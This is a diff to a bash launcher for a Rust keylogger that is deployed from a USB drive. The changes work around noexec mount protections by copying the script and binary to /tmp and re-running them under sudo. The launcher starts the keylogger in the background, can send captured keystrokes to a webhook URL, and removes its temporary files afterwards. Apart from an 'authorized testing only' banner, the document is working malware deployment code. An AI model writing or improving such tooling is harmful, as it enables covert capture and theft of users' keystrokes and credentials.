@@ -4,6 +4,21 @@
 # ⚠️  WARNING: For Educational and Authorized Security Testing Only!
 # Unauthorized use may be illegal in your jurisdiction.
 
+# Track if we're running from a temp script (passed as second argument)
+IS_TEMP_SCRIPT="$2"
+
+# Cleanup function for temp script (only cleans up the temp script itself, not the binary)
+cleanup_temp_script() {
+    if [ "$IS_TEMP_SCRIPT" = "from_temp" ] && [ -n "$0" ] && [ "${0#/tmp/usb_autorun.}" != "$0" ]; then
+        rm -f "$0" 2>/dev/null
+    fi
+}
+
+# Register cleanup trap only if we're the temp script
+if [ "$IS_TEMP_SCRIPT" = "from_temp" ]; then
+    trap cleanup_temp_script EXIT
+fi
+
 echo "=========================================="
 echo "  Rust Keylogger USB Auto-run Script"
 echo "=========================================="
@@ -24,7 +39,8 @@ if [ ! -f "$BINARY_PATH" ]; then
 fi
 
 # Make the binary executable if it isn't already
-chmod +x "$BINARY_PATH" 2>/dev/null
+# Note: chmod may fail on FAT32/exFAT filesystems, but that's okay
+chmod +x "$BINARY_PATH" 2>/dev/null || true
 
 echo "📍 Script location: $SCRIPT_DIR"
 echo "📦 Binary location: $BINARY_PATH"
@@ -36,8 +52,24 @@ if [ "$EUID" -ne 0 ]; then
     echo "You will be prompted for your password."
     echo ""
     
-    # Re-run this script with sudo
-    exec sudo bash "$0" "$@"
+    # Re-run this script with sudo, using absolute path to work from USB mount points
+    # Copy the script to /tmp first to avoid issues with noexec/nosuid mount options
+    TEMP_SCRIPT=$(mktemp /tmp/usb_autorun.XXXXXX.sh)
+    cp "$0" "$TEMP_SCRIPT"
+    chmod +x "$TEMP_SCRIPT"
+    # Pass "from_temp" as second arg to signal temp script cleanup should happen
+    exec sudo bash "$TEMP_SCRIPT" "$SCRIPT_DIR" "from_temp" "$@"
+fi
+
+# If first argument is a directory path, it means we were called from temp script
+if [ -d "$1" ]; then
+    SCRIPT_DIR="$1"
+    shift
+    # Second arg might be "from_temp" flag, shift it too
+    if [ "$1" = "from_temp" ]; then
+        shift
+    fi
+    BINARY_PATH="$SCRIPT_DIR/rust-key"
 fi
 
 echo "✅ Running with sudo privileges"
@@ -77,19 +109,67 @@ mkdir -p "$SCRIPT_DIR/logs"
 
 # Run the keylogger with optional webhook URL
 # Log file will be created in the USB drive's logs directory
+# Note: USB drives mounted in /run/media often have 'noexec' option which prevents direct execution
+# To work around this, we copy the binary to /tmp first if we detect we're on a noexec filesystem
+
+# Function to check if we're on a noexec filesystem
+is_noexec_mount() {
+    local file_path="$1"
+    local mount_point
+    
+    # Try to use --output=target if available, fall back to traditional parsing
+    mount_point=$(df --output=target "$file_path" 2>/dev/null | tail -1)
+    if [ -z "$mount_point" ]; then
+        # Fallback for systems without --output support
+        mount_point=$(df "$file_path" 2>/dev/null | tail -1 | awk '{print $6}')
+    fi
+    
+    # Check if df succeeded and mount_point is not empty
+    if [ -z "$mount_point" ]; then
+        return 1  # Can't determine, assume not noexec
+    fi
+    
+    # Verify mount_point is actually a directory
+    if [ ! -d "$mount_point" ]; then
+        return 1  # Invalid mount point, assume not noexec
+    fi
+    
+    # Use -F for literal string matching to avoid regex issues with special characters
+    if mount | grep -F " $mount_point " | grep -q noexec; then
+        return 0  # true, is noexec
+    fi
+    return 1  # false, not noexec
+}
+
+# Check if we need to copy the binary to /tmp
+EXEC_PATH="$BINARY_PATH"
+if is_noexec_mount "$BINARY_PATH"; then
+    echo "⚠️  USB drive mounted with 'noexec' option detected"
+    echo "   Copying binary to /tmp to enable execution..."
+    EXEC_PATH=$(mktemp /tmp/rust-key.XXXXXX)
+    cp "$BINARY_PATH" "$EXEC_PATH"
+    chmod +x "$EXEC_PATH"
+    echo "✅ Binary copied to $EXEC_PATH"
+    echo ""
+fi
+
+# Run the keylogger
 if [ -n "$WEBHOOK_URL" ]; then
     # Run in background with nohup, redirect output to USB drive
-    nohup "$BINARY_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    nohup "$EXEC_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
     KEYLOGGER_PID=$!
 else
     # Run in background with nohup, redirect output to USB drive
-    nohup "$BINARY_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    nohup "$EXEC_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
     KEYLOGGER_PID=$!
 fi
 
 echo "✅ Keylogger started with PID: $KEYLOGGER_PID"
 echo ""
 echo "📝 Keystrokes will be logged to: $SCRIPT_DIR/logs/keylog.txt"
+if [ "$EXEC_PATH" != "$BINARY_PATH" ]; then
+    echo "ℹ️  Binary is running from: $EXEC_PATH (copied from USB due to noexec mount)"
+fi
 if [ -n "$WEBHOOK_URL" ]; then
     echo "🌐 Keystrokes will be sent to: $WEBHOOK_URL"
 fi
@@ -100,12 +180,23 @@ echo "⚠️  Remember: Only use this on systems you own or have explicit permis
 echo ""
 
 # Optional: Create a stop script for convenience
+# The stop script also cleans up the temp binary if it exists
 cat > "$SCRIPT_DIR/stop_keylogger.sh" << EOF
 #!/bin/bash
 echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
-sudo kill $KEYLOGGER_PID 2>/dev/null && echo "✅ Keylogger stopped" || echo "❌ Keylogger not found or already stopped"
+if sudo kill $KEYLOGGER_PID 2>/dev/null; then
+    echo "✅ Keylogger stopped"
+    # Clean up temp binary if it exists
+    if [ -f "$EXEC_PATH" ] && [ "${EXEC_PATH#/tmp/rust-key.}" != "$EXEC_PATH" ]; then
+        rm -f "$EXEC_PATH" 2>/dev/null
+        echo "✅ Temporary binary cleaned up"
+    fi
+else
+    echo "❌ Keylogger not found or already stopped"
+fi
 EOF
 
-chmod +x "$SCRIPT_DIR/stop_keylogger.sh"
+chmod +x "$SCRIPT_DIR/stop_keylogger.sh" 2>/dev/null || true
 echo "📌 A stop script has been created: $SCRIPT_DIR/stop_keylogger.sh"
+echo "   (Run with: bash $SCRIPT_DIR/stop_keylogger.sh)"
 echo ""
